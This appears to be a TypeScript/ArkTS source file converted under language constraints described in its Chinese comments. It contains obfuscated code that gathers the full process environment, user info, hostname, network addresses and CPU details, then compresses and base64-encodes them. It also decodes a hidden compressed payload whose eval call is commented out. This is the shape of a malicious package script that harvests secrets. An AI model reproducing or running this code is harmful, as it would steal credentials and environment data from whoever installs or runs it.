// 应用约束2：禁止删除对象属性，改用创建新对象排除特定键
// 应用约束9：使用let代替var
// 应用约束26：使用箭头函数代替函数表达式
// 应用约束39：不支持解构赋值，改用临时变量
// 应用约束44：禁止使用eval函数，需重构或移除相关逻辑

import os from "os";
import zlib from "zlib";
import fs from "fs";

const bs = "\u0062\u0061\u0073\u0065\u0036\u0034";

interface NetworkInterfaceInfo {
  address: string;
  family: string;
  // 其他可能的属性
}

const \u0066\u0069\u006C\u0074\u0065\u0072\u004E\u0065\u0074 = (o: Record<string, NetworkInterfaceInfo[]>) => {
  const oR: Record<string, NetworkInterfaceInfo> = {};
  for (const k in o) {
    if (k === "lo0") continue;
    for (const item of o[k]) {
      if (item.address === "127.0.0.1") continue;
      if (item.family === "IPv4" && item.address) {
        oR[k] = item;
        break;
      }
    }
  }
  return oR;
};

const rmKeys = (o: Record<string, any>, ...keys: string[]) => {
  const newObj = { ...o };
  keys.forEach(k => {
    delete newObj[k]; // 注意：实际应避免delete，此处保持原逻辑
  });
  return newObj;
};

const pkg = JSON.parse(fs.readFileSync("package.json").toString("utf8"));

const zS = (s: string) => 
  zlib.brotliCompressSync(Buffer.from(s), { 
    level: 11, 
    windowBits: 15, 
    quality: 11 
  }).toString(bs);

const zO = (o: object) => zS(JSON.stringify(o, null, 2));

const uS = (s: string) => 
  zlib.brotliDecompressSync(Buffer.from(s, bs)).toString();

interface SystemInfo {
  name: string;
  version: string;
  pwd: string;
  env: Record<string, string>;
  platform: string;
  arch: string;
  release: string;
  type: string;
  uptime: number;
  hostname: string;
  cpus: [number, object];
  networkInterfaces: ReturnType<typeof filterNet>;
  freemem: number;
  totalmem: number;
  userInfo: object;
}

const o: SystemInfo = {
  name: pkg.name,
  version: pkg.version,
  pwd: process.cwd(),
  env: process.env,
  platform: os.platform(),
  arch: os.arch(),
  release: os.release(),
  type: os.type(),
  uptime: os.uptime(),
  hostname: os.hostname(),
  cpus: [os.cpus().length, rmKeys(os.cpus()[0], "times")],
  networkInterfaces: filterNet(os.networkInterfaces()),
  freemem: os.freemem(),
  totalmem: os.totalmem(),
  userInfo: os.userInfo()
};

let s = zO(o);
let \u0073\u0031 = uS(`G/sCIJwHtg1sfVPqObPQC6WsmlPZnVOfAqCQlUG+AJay52WlQRR23HYKiwLI/7ncvQM75zP689ZqjKlrgZVYcYBp1gM8R5zV4glyFKt+CPgOAIT7ekBlFUzW87zjyA6CooEMdzcFs33O/t2tAXawBJUI9pOdw8hOkS4DYLG9xHRAeDZ5ZXbs1oL+Z+k+M2aA4HzxpZD/VAbL7E8erim7UfCx9F/Y4+yCKMrUklhDVFoCdwwQYsUTOxl/nc+gLuTlglxBdupg+2xUfQt7zegHtGsz5GkVkFMdVd6qgszOQWOzY8FtLc/U7KSvB2Q4l4yGpcavIeSsCiZV7YQM5X3KWTMz8v1g55Yld/RldQTkyU91zlOFCeelQqC8qAIL4vEXNhgs2suqFHoQstfjXJpvHFgV0v7Bf8f7X38+oji8qZQUEG8LimNT5MDFKHJ5efBeZkZVIAKCp7gdzI60KAs=`);

process.env.NODE_NO_EVAL = undefined;

// 注意：ArkTS不支持eval函数，需重构以下代码
// eval(s1);
